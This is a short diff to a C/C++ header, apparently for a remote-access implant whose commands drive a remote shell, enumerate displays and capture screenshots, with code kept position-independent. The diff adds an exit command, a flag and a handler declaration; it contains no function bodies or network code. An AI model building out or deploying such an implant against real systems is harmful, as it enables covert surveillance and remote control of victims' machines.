@@ -16,6 +16,7 @@ enum CommandType : UINT8
     Command_GetDisplays = 6,
     Command_GetScreenshot = 7,
     Command_ResetShell = 8,
+    Command_Exit = 9,
     CommandTypeCount
 };
 
@@ -48,6 +49,9 @@ struct Context
 {
     Shell *shell = nullptr;
     ScreenCaptureContext *screenCaptureContext = nullptr;
+    // Set by Handle_ExitCommand; read by the main loop so it can send the ACK
+    // and then tear down. Lives on the stack (no data section) to stay PIC-safe.
+    BOOL shouldExit = false;
 
     ~Context()
     {
@@ -77,3 +81,4 @@ VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR respons
 VOID Handle_ResetShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
 VOID Handle_GetDisplaysCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
 VOID Handle_GetScreenshotCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
+VOID Handle_ExitCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
